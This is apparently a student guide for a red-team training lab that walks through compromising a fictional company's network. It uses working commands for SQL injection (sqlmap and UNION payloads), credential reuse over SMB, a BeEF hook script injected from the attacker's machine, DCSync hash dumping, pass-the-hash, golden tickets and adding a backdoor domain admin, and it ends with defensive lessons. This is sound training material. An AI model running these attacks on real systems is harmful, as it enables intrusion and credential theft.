# Red Team Training Lab - Student Guide

## Lab Overview

Welcome to the Red Team Training Lab. You will play the role of a penetration tester who has been hired to assess Acme Widgets' security posture. Your goal is to gain Domain Admin access starting from a position outside the network.

### Network Architecture

```
                    INTERNET (172.16.0.0/24)
                    +---------------------------+
                    |  kali (172.16.0.10)       |  <-- Your Attack Box
                    |  wordpress (172.16.0.100) |  <-- WordPress (your target!)
                    +-----------+---------------+
                                |
                    ============|============  (Firewall)
                                |
                    DMZ (172.16.1.0/24)
                    +-----------------------+
                    | wordpress (172.16.1.10) |  <-- Same server, internal IP
                    +-----------+-----------+
                                |
                    ============|============  (Firewall)
                                |
                    INTERNAL (172.16.2.0/24)
                    +-----------------------+
                    | fileserver (172.16.2.10) |  <-- SMB File Server
                    | ws01 (172.16.2.11)       |  <-- Employee Workstation
                    | dc01 (172.16.2.12)       |  <-- Domain Controller
                    +-----------------------+

Note: The wordpress server is multi-homed - accessible from your network at
172.16.0.100 and internally at 172.16.1.10.
```

### Learning Objectives

By the end of this lab, you will understand:
- Network reconnaissance and enumeration
- SQL injection attacks and credential extraction
- Cross-site scripting (XSS) and browser exploitation with BeEF
- Lateral movement using stolen credentials
- Active Directory attacks (DCSync)
- The importance of defense-in-depth

---

## Phase 1: Reconnaissance

### 1.1 Understanding Your Position

First, let's understand our position in the network. Open a terminal on your Kali box.

```bash
# Check your IP address
ip addr show eth0
```

You should see `172.16.0.10` - you're on the "internet" network, simulating an external attacker.

### 1.2 Network Discovery

Let's discover what hosts are reachable from our position.

```bash
# Scan your network (the "Internet" segment where attackers start)
nmap -sn 172.16.0.0/24
```

**What you're doing:** This performs a ping sweep to find live hosts without doing a full port scan. The `-sn` flag means "no port scan" - just host discovery.

**Expected result:** You should find several hosts including `172.16.0.100` (webserver) - this is your primary target.

### 1.3 Service Enumeration

Now let's see what services are running on the discovered host.

```bash
# Full port scan with service detection
nmap -sV -sC 172.16.0.100
```

**What the flags mean:**
- `-sV`: Probe open ports to determine service/version info
- `-sC`: Run default NSE scripts for additional enumeration
- `-p-`: Scan all 65535 ports (not just common ones)

**Expected result:** You should see:
- Port 22 (SSH) - OpenSSH server
- Port 80 (HTTP) - Apache web server

---

## Phase 2: Web Application Attack (SQL Injection)

### 2.1 Web Enumeration

Let's explore the web application.

```bash
# Open the website in a browser or use curl
curl -s http://172.16.0.100 | head -50
```

Or open Firefox and navigate to `http://172.16.0.100`

**What you're looking for:**
- Technology stack (WordPress, custom app, etc.)
- Interesting pages and functionality
- Login forms, search boxes, or other user input fields

### 2.2 Directory Discovery

Let's find hidden directories and pages.

```bash
# Use gobuster to find directories
gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
```

**What you're doing:** Brute-forcing common directory names to find hidden content.

**Expected results:** You should find several interesting directories:
- `/wp-admin/` - WordPress admin panel
- `/wp-content/` - WordPress content directory
- `/wp-includes/` - WordPress core files
- `/employees/` - **This is our target!** An Employee Directory page

### 2.3 Exploring the Employee Directory

Navigate to the Employee Directory you discovered:

```bash
# Open in browser or use curl
curl -s "http://172.16.0.100/employees/" | head -100
```

Or browse to: `http://172.16.0.100/employees/`

You'll see a table of employees with a search box, and links to view individual employee details. Click on an employee name to see their detail page - notice the URL changes to include `?employee_id=1`.

### 2.4 Understanding SQL Injection

**What is SQL Injection?**

SQL Injection (SQLi) occurs when user input is inserted directly into a SQL query without proper sanitization. This allows attackers to manipulate the query's logic and access or modify data they shouldn't be able to reach.

**How does it work?**

Imagine a web application that looks up employee details with code like this:

```php
// VULNERABLE CODE - Never do this!
$query = "SELECT * FROM employees WHERE id = " . $_GET['employee_id'];
```

When you visit `?employee_id=1`, the query becomes:
```sql
SELECT * FROM employees WHERE id = 1
```

But what if you visit `?employee_id=1 OR 1=1`? The query becomes:
```sql
SELECT * FROM employees WHERE id = 1 OR 1=1
```

Since `1=1` is always true, this returns ALL employees instead of just one!

**Why is this dangerous?**

With SQL injection, attackers can:
- **Read sensitive data** - Extract usernames, passwords, credit cards
- **Bypass authentication** - Log in without valid credentials
- **Modify data** - Change prices, delete records, add admin accounts
- **Execute system commands** - On some databases, run OS commands

**Boolean-Based Testing**

The simplest way to test for SQLi is with boolean conditions:
- `AND 1=1` - Always TRUE, query should work normally
- `AND 1=2` - Always FALSE, query should return nothing

If the page behaves differently between these two, the input is being executed as SQL!

### 2.5 Testing for SQL Injection

The page has two potential injection points:
1. The `search` parameter (search box)
2. The `employee_id` parameter (employee detail links)

Let's test the `employee_id` parameter - it's a numeric field which is often easier to exploit:

```bash
# Normal request - should show employee notes
curl -s "http://172.16.0.100/employees/?employee_id=1" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
```

**Expected output:** `IT admin, has server access`

Now test with boolean SQL injection:

```bash
# Boolean true (1=1) - should still show notes (spaces URL-encoded as %20)
curl -s "http://172.16.0.100/employees/?employee_id=1%20AND%201=1" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
```

**Expected output:** `IT admin, has server access` (same as before)

```bash
# Boolean false (1=2) - should return NOTHING
curl -s "http://172.16.0.100/employees/?employee_id=1%20AND%201=2" | grep -o 'Notes:</strong>[^<]*' | sed 's/Notes:<\/strong> //'
```

**Expected output:** (empty - no output!)

**Understanding the attack:**
- `WHERE id = 1 AND 1=1` (true) → returns the employee row → shows notes
- `WHERE id = 1 AND 1=2` (false) → returns no rows → no notes section
- **Different responses confirm SQL injection!** The injected SQL is being executed.

### 2.6 Extracting Data with SQLMap

Now let's use sqlmap to automate the extraction:

```bash
# Let sqlmap identify the vulnerability on employee_id parameter
sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --batch
```

**What `-p employee_id` does:** Tells sqlmap to focus on the employee_id parameter.

Once confirmed, let's enumerate the database:

```bash
# List all databases
sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --dbs --batch
```

```bash
# List tables in the WordPress database
sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress --tables --batch
```

**Expected result:** You should see a table called `wp_acme_employees`.

### 2.7 Dumping Credentials

```bash
# Dump the employee table
sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress -T wp_acme_employees --dump --batch
```

**CRITICAL FINDING:** The output reveals VPN credentials stored in plaintext:

| employee_id | full_name | vpn_username | vpn_password |
|-------------|-----------|--------------|--------------|
| EMP001 | John Smith | jsmith | Summer2024 |
| EMP002 | Mary Williams | mwilliams | Welcome123 |
| EMP003 | Backup Service | svc_backup | Backup2024 |

**Why this matters:**
- Credentials are stored in plaintext (bad practice)
- These might be reused on other systems (password reuse)
- Service accounts often have elevated privileges

---

## Phase 3: Lateral Movement (Credential Reuse)

### 3.1 Understanding the Internal Network

From our recon, we know there's an internal network at `172.16.2.0/24`. While we can't access it directly from the internet, perhaps the DMZ webserver can.

However, let's first test if any of these credentials work on any accessible services.

### 3.2 Testing SMB Access

Let's see if there's a file server accessible that uses these same credentials. This tests for **credential reuse** - one of the most common attack vectors.

**Method 1: Using Impacket (Recommended for Red Team)**

```bash
# Connect to the file server with impacket-smbclient
impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
```

Once connected, list available shares:
```
# shares
```

**Method 2: Using Standard smbclient**

```bash
# List shares with standard smbclient
smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'
```

**What you're doing:** Testing if the `svc_backup` credentials from the WordPress database also work on the file server (credential reuse attack).

**Expected result:** You should see shares including:
- `public` - Open to everyone
- `sensitive` - Restricted (but svc_backup has access!)
- `accounting` - Financial documents
- `IPC$` - Inter-process communication

### 3.3 Accessing Sensitive Files

**Method 1: Using Impacket**

```bash
impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
```

Once connected, explore the contents:
```
# use sensitive
# ls
# cat passwords.txt
```

**Method 2: Using Standard smbclient**

```bash
# List files in the sensitive share
smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024' -c 'ls'

# Read passwords.txt directly to stdout
smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024' -c 'get passwords.txt -'
```

**Command Reference:**

| Impacket | smbclient | Description |
|----------|-----------|-------------|
| `shares` | `-L //host` | List shares |
| `use <share>` | `//host/share` | Connect to share |
| `ls` | `-c 'ls'` | List files |
| `cat <file>` | `-c 'get file -'` | Display contents |
| `get <file>` | `-c 'get file'` | Download file |

**One-liner alternatives:**
```bash
# Impacket
echo -e 'use sensitive\ncat passwords.txt\nexit' | impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'

# Standard smbclient
smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024' -c 'get passwords.txt -'
```

### 3.4 Critical Discovery

Examine the downloaded files:

```bash
cat passwords.txt
```

**CRITICAL FINDING:** You've discovered:
```
Domain Admin (emergency): Adm1n2024
```

**Why this matters:** You now have the Domain Administrator password. But let's explore another attack path that would work even without finding this file.

---

## Phase 4: Browser Exploitation with BeEF (XSS)

### 4.1 Understanding XSS

The Employee Directory has another vulnerability: Cross-Site Scripting (XSS) in the "notes" field. If we can inject JavaScript, we can attack anyone who views that page.

### 4.2 Starting BeEF

BeEF (Browser Exploitation Framework) lets you control browsers that execute your JavaScript hook.

```bash
# Start BeEF (on Kali)
beef-xss
```

**Default credentials:** `beef` / `beef`

Access the BeEF console at: `http://127.0.0.1:3000/ui/panel`

The hook URL will be something like:
```
http://172.16.0.10:3000/hook.js
```

### 4.3 Injecting the Hook via SQL Injection

We can use SQL injection to UPDATE an employee's notes field with our BeEF hook:

```bash
# Using sqlmap to inject our XSS payload
sqlmap -u "http://172.16.0.100/employees/?search=test" \
  --sql-query="UPDATE wp_acme_employees SET notes='<script src=\"http://172.16.0.10:3000/hook.js\"></script>' WHERE employee_id='EMP001'"
```

**What you're doing:**
- Using SQL injection to modify database content
- Injecting a `<script>` tag that loads BeEF's hook.js
- Anyone viewing EMP001's details will execute this script

### 4.4 Waiting for Victims

The workstation (`ws01`) is simulating an employee who periodically browses the WordPress site. When they view the employee directory and click on the infected employee...

**Watch the BeEF console!** You should see a new browser appear under "Online Browsers."

### 4.5 Browser Exploitation

Once a browser is hooked, you can:

1. **Get browser info:** See browser version, plugins, OS
2. **Get cookies:** Steal session cookies
3. **Social engineering:** Display fake login prompts
4. **Network discovery:** Use the victim's browser to scan internal networks

Try these BeEF modules:
- `Browser > Get Cookie`
- `Social Engineering > Pretty Theft` (fake login)
- `Network > Get Internal IP`

---

## Phase 5: Active Directory Attack (DCSync)

### 5.1 Understanding DCSync

Remember the `svc_backup` account? This service account has been misconfigured with "Replicating Directory Changes" permissions. This allows it to perform a DCSync attack - pretending to be a Domain Controller and requesting password hashes.

### 5.2 Performing DCSync with Impacket

```bash
# Use secretsdump.py to perform DCSync
impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024@172.16.2.12'
```

**Note:** Samba 4 (which this lab uses) has limited DCSync support. If secretsdump fails with `rpc_s_access_denied`, you can still use the Domain Admin credentials discovered in `passwords.txt` to compromise the domain.

**What you're doing:**
- Authenticating as `svc_backup`
- Using the "Replicating Directory Changes" permission
- Requesting all password hashes from the DC (just like a real DC would)

**Expected output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXX:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXX:::
jsmith:1103:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXX:::
...
```

### 5.3 Understanding the Output

The format is: `username:RID:LM_hash:NTLM_hash:::`

**Why this matters:**
- NTLM hashes can be used for Pass-the-Hash attacks
- They can be cracked offline to reveal plaintext passwords
- The `krbtgt` hash allows Golden Ticket attacks

### 5.4 Verifying Domain Admin Access

**Important Note:** This lab uses Samba 4 AD (Linux-based) rather than Windows Server. Some Windows-specific tools won't work:
- `impacket-psexec` - Requires Windows Service Control Manager
- `impacket-wmiexec` - Requires Windows WMI service

Instead, verify your Domain Admin access via SMB:

```bash
# List shares on the Domain Controller with Domain Admin credentials
smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'

# Access the SYSVOL share (only Domain Admins can write here)
smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
```

You can also verify via LDAP:
```bash
# Query domain users as Domain Admin
ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
  -w 'Adm1n2024' -b 'DC=acmewidgets,DC=local' '(objectClass=user)' cn -ZZ
```

**You now have Domain Admin access!**

**In a real Windows environment**, you would use Pass-the-Hash:
```bash
# Use the Administrator's NTLM hash to get a shell (Windows AD only)
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@<DC_IP>
```

---

## Phase 6: Post-Exploitation

### 6.1 Verify Your Access

Since this is a Samba-based AD (Linux), we verify access via SMB and LDAP rather than Windows commands:

```bash
# Verify you can access privileged shares
smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'

# List all files in the domain SYSVOL
smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'recurse; ls'
```

### 6.2 Explore the Domain

Use LDAP or Samba tools to enumerate the domain:

```bash
# List all domain users (via samba-tool if you have shell access)
# Or enumerate via LDAP from Kali:
ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
  -w 'Adm1n2024' -b 'cn=Users,DC=acmewidgets,DC=local' '(objectClass=user)' sAMAccountName -ZZ

# Check group memberships
ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
  -w 'Adm1n2024' -b 'DC=acmewidgets,DC=local' '(cn=Domain Admins)' member -ZZ
```

### 6.3 Create Persistence (For Education Only)

**WARNING:** In real engagements, only create persistence if explicitly authorized.

In a Windows AD environment, you would:
```bash
# Create a new domain admin (Windows AD only)
net user hacker P@ssw0rd /add /domain
net group "Domain Admins" hacker /add /domain
```

In this Samba lab, persistence could be achieved by:
- Adding SSH keys to the DC
- Creating a new domain user via LDAP
- Modifying SYSVOL scripts

---

## Attack Summary

Here's the complete attack chain you executed:

```
1. RECONNAISSANCE
   └── Network scanning with nmap
       └── Found webserver at 172.16.0.100 (ports 22, 80)

2. WEB APPLICATION ATTACK
   └── Gobuster discovered /employees/ directory
       └── SQL Injection in employee_id parameter
           └── Extracted plaintext VPN credentials:
               - jsmith / Summer2024
               - mwilliams / Welcome123
               - svc_backup / Backup2024

3. LATERAL MOVEMENT
   └── Credential reuse on file server (172.16.2.10)
       └── svc_backup can access "sensitive" SMB share
           └── Found Domain Admin password in passwords.txt

4. BROWSER EXPLOITATION (Alternative Path)
   └── XSS injection via SQL Injection
       └── BeEF hook captured employee browser
           └── Social engineering / internal network access

5. DOMAIN COMPROMISE
   └── Used Domain Admin credentials from passwords.txt
       └── Authenticated to DC01 SYSVOL share
           └── Full administrative access to acmewidgets.local

Note: DCSync has limited support on Samba 4 AD. In a Windows AD environment,
you could also use svc_backup's DCSync rights to extract password hashes.
```

---

## Defensive Lessons

### What Went Wrong (Blue Team Perspective)

| Vulnerability | Impact | Mitigation |
|--------------|--------|------------|
| SQL Injection | Credential theft | Parameterized queries, input validation, WAF |
| Plaintext passwords in database | Direct credential exposure | Hash passwords, use secrets manager |
| Stored XSS | Browser compromise | Output encoding, CSP headers |
| Password reuse | Lateral movement | Unique passwords, password manager |
| Sensitive files on share | Data exfiltration | Proper access controls, DLP |
| DCSync rights for service account | Domain compromise | Principle of least privilege |
| No network segmentation | Easy pivoting | Proper firewall rules, Zero Trust |

### Key Takeaways

1. **Defense in Depth:** One vulnerability shouldn't lead to total compromise
2. **Least Privilege:** Service accounts should only have necessary permissions
3. **Password Hygiene:** Never reuse passwords; never store in plaintext
4. **Input Validation:** All user input is potentially malicious
5. **Monitoring:** Would anyone have detected these attacks?

---

## Challenge Questions

1. Could you have completed this attack without the SQL injection? What would be different?

2. The `svc_backup` account had DCSync rights. What legitimate business need might have led to this misconfiguration?

3. If you were the defender, what single change would have the biggest impact on preventing this attack chain?

4. What logs would you look for to detect each phase of this attack?

5. How would MFA have affected this attack? At which points?

---

## Additional Exercises

### Exercise 1: Manual SQL Injection
Instead of using sqlmap, try to extract data manually using UNION-based injection:
```bash
# Find the number of columns (try increasing until no error)
# Spaces must be URL-encoded as %20
curl "http://172.16.0.100/employees/?employee_id=1%20ORDER%20BY%2010--%20-"

# Extract data with UNION
curl "http://172.16.0.100/employees/?employee_id=-1%20UNION%20SELECT%201,2,3,vpn_username,vpn_password,6,7,8,9,10%20FROM%20wp_acme_employees--%20-"
```

### Exercise 2: Password Cracking
If you obtained NTLM hashes (from a Windows AD), crack them with hashcat:
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Exercise 3: Golden Ticket (Windows AD only)
**Note:** This exercise requires a Windows-based AD. Samba 4 has limited Kerberos ticket support.

Using the `krbtgt` hash from DCSync, create a Golden Ticket for persistent access:
```bash
impacket-ticketer -domain acmewidgets.local -domain-sid <SID> -krbtgt <HASH> Administrator
```

### Exercise 4: BloodHound Analysis
**Note:** BloodHound works best with Windows AD. Results may be limited on Samba 4.

Run BloodHound to visualize the attack paths:
```bash
bloodhound-python -u svc_backup -p 'Backup2024' -d acmewidgets.local -ns 172.16.2.12
```

---

## Quick Reference Commands

```bash
# Network scanning
nmap -sn 172.16.0.0/24                    # Host discovery (internet segment)
nmap -sn 172.16.2.0/24                    # Host discovery (internal segment)
nmap -sV -sC <IP>                         # Service scan with scripts

# SQL Injection (this lab)
sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id --dbs --batch
sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress --tables --batch
sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordpress -T wp_acme_employees --dump --batch

# SMB with smbclient
smbclient -L //<IP> -U '<user>%<pass>'              # List shares
smbclient //<IP>/<share> -U '<user>%<pass>' -c 'ls' # List files
smbclient //<IP>/<share> -U '<user>%<pass>' -c 'get <file> -'  # Download file

# SMB with Impacket (alternative)
impacket-smbclient '<user>:<pass>@<IP>'             # Interactive SMB
# Inside: shares, use <share>, ls, cat <file>, get <file>

# Active Directory with Impacket
impacket-secretsdump '<domain>/<user>:<pass>@<DC>'  # DCSync (limited on Samba)

# Windows AD only (won't work on Samba):
# impacket-psexec '<user>:<pass>@<IP>'              # Remote shell via SMB
# impacket-wmiexec '<user>:<pass>@<IP>'             # Remote shell via WMI

# BeEF
beef-xss                                   # Start BeEF
# Hook: <script src="http://<kali>:3000/hook.js"></script>
```

---

**Good luck, and remember: Only use these techniques with explicit authorization!**
